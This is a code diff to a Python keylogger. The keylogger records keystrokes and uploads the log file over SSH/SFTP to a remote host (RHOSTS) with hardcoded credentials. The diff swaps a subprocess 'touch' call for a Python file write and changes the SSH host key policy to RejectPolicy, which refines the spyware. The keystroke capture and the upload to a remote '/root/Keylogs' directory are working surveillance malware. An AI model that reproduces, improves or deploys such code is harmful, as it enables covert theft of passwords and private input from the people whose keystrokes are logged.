@@ -13,8 +13,9 @@ password = "password" #Change this
 text = ""
 
 # Sometimes the program gets iffy and doesn't write the log file, this will fix that
-cmd = "touch /tmp/logs.txt"
-subprocess.Popen(shlex.split(cmd))
+logfile = "/tmp/logs.txt"
+with open(logfile, "w") as thelogs:
+    thelogs.write("")
 
 # Record the keys
 def on_press(key):
@@ -49,7 +50,7 @@ def on_release(key):
 #Send the logs over SSH
 def send_logs():
     s = paramiko.SSHClient()
-    s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    s.set_missing_host_key_policy(paramiko.RejectPolicy())
     s.connect(RHOSTS, 22, username=user, password=password,timeout = 15)
     sftp = s.open_sftp()
     sftp.put("/tmp/logs.txt", "/root/Keylogs/logs.txt")
